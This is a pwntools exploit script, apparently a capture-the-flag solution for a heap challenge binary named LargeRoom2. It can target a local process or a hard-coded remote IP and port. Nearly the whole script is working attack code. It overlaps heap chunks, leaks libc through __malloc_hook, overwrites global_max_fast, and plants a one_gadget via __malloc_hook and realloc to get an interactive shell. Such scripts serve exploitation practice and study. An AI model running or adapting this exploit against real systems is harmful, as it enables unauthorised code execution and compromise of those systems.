# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './LargeRoom2'
# os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('./libc.so')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '152.136.122.197'
    port = '54100'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice :',num)

def add(size):
    cmd(1)
    sla('ize:',size)

def edit(idx , data):
    cmd(4)
    sla('id of room:' , idx)
    sla('New Content' , data)

def name(data):
    cmd(5)
    sla('name:' , data)

def delete(idx):
    cmd(3)
    sla('id of room:' , idx)

def show(idx):
    cmd(2)
    sla('id of room:' , idx)

# one_gad = one_gadget(libc.path)
# 2.23
# ptr_list = 0x2020E0

def attack():
    name( 'niyah' )
    add(0x408) #0
    add(0x408) #1
    add(0x7ff8) #2
    add(0x4f8) #3
    add(0x418) #4

    delete(0)
    edit(2 , '\x00'*0x7ff0 + p64(0x410*2 + 0x7ff8 + 8))
    delete(3)

    add(0x408) #0
    show(1)

    __malloc_hook = l64() - 0x68
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    global_max_fast = 0x3c67f8 + libc.address
    ogg = 0x4527a + libc.address

    size = (__malloc_hook >> 32) & 0xfff0

    lg('size',size)
    add(0x408) #3
    add( size -8 ) #5
    add(0x4f8) #6

    delete(1)
    edit(3 , flat( __malloc_hook + 0x68 , global_max_fast -0x10))
    
    add(0x408)
    dbg()
    delete(5)
    edit(2 , flat(__malloc_hook - 0x24))

    lg('__malloc_hook',__malloc_hook)
    lg('__free_hook',__free_hook)
    # # dbg()
    add(size - 8)
    add(size - 8)

    edit(7 , flat('a'*(0x14 - 8) , ogg , realloc +2 ))
    # delete(1)
    # dbg('calloc')
    add(0x400)

    # dbg()

    # sl('echo shell')
    # ru('shell')
    p.interactive()

# exhaust(attack)
attack()

'''
@File    :   LargeRoom.py
@Time    :   2021/10/23 13:15:22
@Author  :   Niyah 
'''